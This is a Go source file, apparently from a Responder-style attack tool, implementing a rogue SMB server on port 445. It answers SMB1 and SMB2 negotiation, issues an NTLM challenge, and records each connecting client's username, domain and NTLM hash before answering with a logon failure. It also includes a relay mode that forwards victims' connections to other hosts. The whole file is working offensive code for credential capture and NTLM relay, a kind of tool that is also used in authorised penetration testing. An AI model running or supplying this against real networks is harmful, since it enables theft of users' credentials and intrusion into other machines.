package server

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"time"

	"go-responder/internal/analyzer"
	"go-responder/internal/core"
	"go-responder/internal/relay"
)

var (
	smb2Magic  = []byte{0xFE, 0x53, 0x4D, 0x42}
	smb1Magic  = []byte{0xFF, 0x53, 0x4D, 0x42}
	serverGUID [16]byte
)

func init() { rand.Read(serverGUID[:]) }

const (
	smb2CmdNegotiate    = uint16(0x0000)
	smb2CmdSessionSetup = uint16(0x0001)

	statusSuccess                = uint32(0x00000000)
	statusMoreProcessingRequired = uint32(0xC0000016)
	statusLogonFailure           = uint32(0xC000006D)

	smb1CmdNegotiate    = byte(0x72)
	smb1CmdSessionSetup = byte(0x73)
)

func ServeSMB(ip net.IP) {
	ln, err := net.Listen("tcp", fmt.Sprintf("%s:445", ip))
	if err != nil {
		core.LogError("SMB listen :445 - %v (need root?)", err)
		return
	}
	core.LogInfo("SMB  listening on %s:445", ip)
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go HandleSMB(conn)
	}
}

// pickRelayTarget returns the best available relay target for an incoming
// connection from srcIP, or nil when no relay target is available.
func pickRelayTarget(srcIP net.IP) net.IP {
	if len(relay.FixedTargets) > 0 {
		for _, t := range relay.FixedTargets {
			if !t.Equal(srcIP) {
				return t
			}
		}
	}
	return analyzer.Global.BestRelayTarget(srcIP)
}

func HandleSMB(conn net.Conn) {
	defer conn.Close()

	var srcIP net.IP
	if tcpAddr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
		srcIP = tcpAddr.IP
	}

	// If relay mode is on and a target is available, hand the connection off
	// to the relay engine instead of doing a normal capture.
	if core.RelayMode {
		if target := pickRelayTarget(srcIP); target != nil {
			relay.HandleRelay(conn, target)
			return
		}
		core.LogVerbose("[Relay] no relay target available for %s — falling back to capture", srcIP)
	}

	conn.SetDeadline(time.Now().Add(30 * time.Second))

	challenge := core.GetChallenge()
	challengeIssued := false

	for {
		nb := make([]byte, 4)
		if _, err := io.ReadFull(conn, nb); err != nil {
			return
		}
		msgLen := int(nb[1])<<16 | int(nb[2])<<8 | int(nb[3])
		if msgLen < 4 || msgLen > 1<<20 {
			return
		}
		msg := make([]byte, msgLen)
		if _, err := io.ReadFull(conn, msg); err != nil {
			return
		}

		switch {
		case bytes.HasPrefix(msg, smb1Magic):
			if len(msg) < 32 {
				return
			}
			switch msg[4] {
			case smb1CmdNegotiate:
				switch smb1FindDialect(msg) {
				case -1:
					return
				case -2:
					sendNB(conn, smb1SMB2UpgradeResp(msg))
					core.LogVerbose("SMB1 multi-protocol - upgrading to SMB2")
				default:
					sendNB(conn, smb1NegotiateResp(msg, smb1FindDialect(msg)))
				}
			case smb1CmdSessionSetup:
				blob := smb1ExtractBlob(msg)
				if blob == nil {
					return
				}
				ntlm := core.FindNTLMSSP(blob)
				if len(ntlm) < 12 {
					return
				}
				switch core.NTLMMsgType(ntlm) {
				case 1:
					ws, dom, osVer := core.ParseNTLMNegotiate(ntlm)
					analyzer.Global.RegisterNTLMNegotiate(srcIP, ws, dom, osVer)
					ntlmChal := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
					spnego := core.WrapSPNEGOChallenge(ntlmChal)
					challengeIssued = true
					sendNB(conn, smb1SessionSetupResp(msg, statusMoreProcessingRequired, spnego))
				case 3:
					if !challengeIssued {
						return
					}
					hash, user, domain, ntlmVer, err := core.ParseNTLMAuthenticate(ntlm, challenge)
					if err != nil {
						return
					}
					core.SaveCapture("SMB", conn.RemoteAddr().String(), user, domain, ntlmVer, hash)
					sendNB(conn, smb1SessionSetupResp(msg, statusLogonFailure, nil))
					return
				}
			}

		case bytes.HasPrefix(msg, smb2Magic):
			if len(msg) < 64 {
				return
			}
			cmd := binary.LittleEndian.Uint16(msg[12:14])
			msgID := binary.LittleEndian.Uint64(msg[24:32])
			switch cmd {
			case smb2CmdNegotiate:
				sendNB(conn, smb2NegotiateResp(msgID))
			case smb2CmdSessionSetup:
				if len(msg) < 80 {
					return
				}
				secOff := binary.LittleEndian.Uint16(msg[76:78])
				secLen := binary.LittleEndian.Uint16(msg[78:80])
				if int(secOff)+int(secLen) > len(msg) {
					return
				}
				ntlm := core.FindNTLMSSP(msg[secOff : secOff+secLen])
				if len(ntlm) < 12 {
					return
				}
				switch core.NTLMMsgType(ntlm) {
				case 1:
					ws, dom, osVer := core.ParseNTLMNegotiate(ntlm)
					analyzer.Global.RegisterNTLMNegotiate(srcIP, ws, dom, osVer)
					challengeIssued = true
					sendNB(conn, smb2SessionSetupChallenge(msgID, challenge))
				case 3:
					if !challengeIssued {
						return
					}
					hash, user, domain, ntlmVer, err := core.ParseNTLMAuthenticate(ntlm, challenge)
					if err != nil {
						return
					}
					core.SaveCapture("SMB", conn.RemoteAddr().String(), user, domain, ntlmVer, hash)
					sendNB(conn, smb2Error(smb2CmdSessionSetup, msgID, statusLogonFailure))
					return
				}
			}
		default:
			return
		}
	}
}

func smb1FindDialect(msg []byte) int {
	if len(msg) < 35 {
		return -1
	}
	body := msg[32:]
	if len(body) < 3 {
		return -1
	}
	byteCount := int(binary.LittleEndian.Uint16(body[1:3]))
	if 3+byteCount > len(body) {
		return -1
	}
	dialects := body[3 : 3+byteCount]
	idx := 0
	ntlmIdx := -1
	hasSMB2 := false
	for len(dialects) > 1 {
		if dialects[0] != 0x02 {
			break
		}
		dialects = dialects[1:]
		end := bytes.IndexByte(dialects, 0x00)
		if end < 0 {
			break
		}
		switch string(dialects[:end]) {
		case "SMB 2.???", "SMB 2.002":
			hasSMB2 = true
		case "NT LM 0.12":
			ntlmIdx = idx
		}
		dialects = dialects[end+1:]
		idx++
	}
	if hasSMB2 {
		return -2
	}
	return ntlmIdx
}

func smb1SMB2UpgradeResp(_ []byte) []byte { return smb2NegotiateResp(0) }

func smb1NegotiateResp(req []byte, dialectIdx int) []byte {
	mid := binary.LittleEndian.Uint16(req[30:32])
	spnego := core.BuildSPNEGONegotiateToken()
	epoch := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)
	ft := uint64(time.Since(epoch).Nanoseconds() / 100)
	hdr := smb1Header(smb1CmdNegotiate, statusSuccess, 0xFFFF, mid)

	var params []byte
	params = binary.LittleEndian.AppendUint16(params, uint16(dialectIdx))
	params = append(params, 0x03)
	params = binary.LittleEndian.AppendUint16(params, 50)
	params = binary.LittleEndian.AppendUint16(params, 1)
	params = binary.LittleEndian.AppendUint32(params, 16644)
	params = binary.LittleEndian.AppendUint32(params, 65536)
	params = binary.LittleEndian.AppendUint32(params, 0)
	params = binary.LittleEndian.AppendUint32(params, 0x80000374)
	params = binary.LittleEndian.AppendUint64(params, ft)
	params = binary.LittleEndian.AppendUint16(params, 0)
	params = append(params, 0x00)

	data := make([]byte, 16)
	copy(data, serverGUID[:])
	data = append(data, spnego...)

	var pkt []byte
	pkt = append(pkt, hdr...)
	pkt = append(pkt, 17)
	pkt = append(pkt, params...)
	pkt = binary.LittleEndian.AppendUint16(pkt, uint16(len(data)))
	pkt = append(pkt, data...)
	return pkt
}

func smb1ExtractBlob(msg []byte) []byte {
	if len(msg) < 32+1+24+2 {
		return nil
	}
	body := msg[32:]
	if body[0] != 12 {
		return nil
	}
	blobLen := int(binary.LittleEndian.Uint16(body[15:17]))
	if 27+blobLen > len(body) {
		return nil
	}
	return body[27 : 27+blobLen]
}

func smb1SessionSetupResp(req []byte, status uint32, secBlob []byte) []byte {
	mid := binary.LittleEndian.Uint16(req[30:32])
	suffix := []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	byteCount := uint16(len(secBlob) + len(suffix))
	andxOff := uint16(32 + 1 + 8 + 2 + len(secBlob) + len(suffix))
	hdr := smb1Header(smb1CmdSessionSetup, status, 0xFFFF, mid)
	binary.LittleEndian.PutUint16(hdr[28:30], 0x0001)

	var pkt []byte
	pkt = append(pkt, hdr...)
	pkt = append(pkt, 4)
	pkt = append(pkt, 0xFF, 0x00)
	pkt = binary.LittleEndian.AppendUint16(pkt, andxOff)
	pkt = binary.LittleEndian.AppendUint16(pkt, 0x0000)
	pkt = binary.LittleEndian.AppendUint16(pkt, uint16(len(secBlob)))
	pkt = binary.LittleEndian.AppendUint16(pkt, byteCount)
	pkt = append(pkt, secBlob...)
	pkt = append(pkt, suffix...)
	return pkt
}

func smb1Header(cmd byte, status uint32, tid uint16, mid uint16) []byte {
	h := make([]byte, 32)
	copy(h[0:4], smb1Magic)
	h[4] = cmd
	binary.LittleEndian.PutUint32(h[5:9], status)
	h[9] = 0x88
	binary.LittleEndian.PutUint16(h[10:12], 0xC853)
	binary.LittleEndian.PutUint16(h[24:26], tid)
	binary.LittleEndian.PutUint16(h[26:28], 0xFFFE)
	binary.LittleEndian.PutUint16(h[30:32], mid)
	return h
}

func sendNB(conn net.Conn, data []byte) {
	hdr := []byte{0x00, byte(len(data) >> 16), byte(len(data) >> 8), byte(len(data))}
	conn.Write(append(hdr, data...))
}

func smb2Header(cmd uint16, msgID uint64, status uint32, sessionID uint64) []byte {
	h := make([]byte, 64)
	copy(h[0:4], smb2Magic)
	binary.LittleEndian.PutUint16(h[4:6], 64)
	binary.LittleEndian.PutUint32(h[8:12], status)
	binary.LittleEndian.PutUint16(h[12:14], cmd)
	binary.LittleEndian.PutUint16(h[14:16], 1)
	binary.LittleEndian.PutUint32(h[16:20], 0x00000001)
	binary.LittleEndian.PutUint64(h[24:32], msgID)
	binary.LittleEndian.PutUint32(h[32:36], 0xFFFE)
	binary.LittleEndian.PutUint64(h[40:48], sessionID)
	return h
}

func smb2NegotiateResp(msgID uint64) []byte {
	spnego := core.BuildSPNEGONegotiateToken()
	hdr := smb2Header(smb2CmdNegotiate, msgID, statusSuccess, 0)
	epoch := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)
	ft := uint64(time.Since(epoch).Nanoseconds() / 100)
	secBufOff := uint16(64 + 64)

	var b bytes.Buffer
	binary.Write(&b, binary.LittleEndian, uint16(65))
	binary.Write(&b, binary.LittleEndian, uint16(0x0001))
	binary.Write(&b, binary.LittleEndian, uint16(0x0210))
	binary.Write(&b, binary.LittleEndian, uint16(0))
	b.Write(serverGUID[:])
	binary.Write(&b, binary.LittleEndian, uint32(0x7F))
	binary.Write(&b, binary.LittleEndian, uint32(8388608))
	binary.Write(&b, binary.LittleEndian, uint32(8388608))
	binary.Write(&b, binary.LittleEndian, uint32(8388608))
	binary.Write(&b, binary.LittleEndian, ft)
	binary.Write(&b, binary.LittleEndian, uint64(0))
	binary.Write(&b, binary.LittleEndian, secBufOff)
	binary.Write(&b, binary.LittleEndian, uint16(len(spnego)))
	binary.Write(&b, binary.LittleEndian, uint32(0))
	b.Write(spnego)
	return append(hdr, b.Bytes()...)
}

func smb2SessionSetupChallenge(msgID uint64, challenge [8]byte) []byte {
	ntlmChal := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
	spnego := core.WrapSPNEGOChallenge(ntlmChal)
	hdr := smb2Header(smb2CmdSessionSetup, msgID, statusMoreProcessingRequired, 0x1234)
	secBufOff := uint16(64 + 8)
	var b bytes.Buffer
	binary.Write(&b, binary.LittleEndian, uint16(9))
	binary.Write(&b, binary.LittleEndian, uint16(0))
	binary.Write(&b, binary.LittleEndian, secBufOff)
	binary.Write(&b, binary.LittleEndian, uint16(len(spnego)))
	b.Write(spnego)
	return append(hdr, b.Bytes()...)
}

func smb2Error(cmd uint16, msgID uint64, status uint32) []byte {
	hdr := smb2Header(cmd, msgID, status, 0)
	return append(hdr, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
}
